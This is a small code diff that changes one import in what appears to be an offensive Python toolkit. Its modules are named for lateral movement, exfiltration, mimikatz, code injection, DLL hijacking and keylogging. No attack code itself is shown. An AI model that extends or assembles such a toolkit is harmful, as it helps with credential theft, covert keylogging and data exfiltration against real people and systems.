@@ -1,6 +1,6 @@
 import subprocess, os, requests
 from core import movimento_lateral
-import exfiltracao
+from core import exfiltracao
 from core import mimikatz, injecao, dll_hijack
 from core import keylogger
 
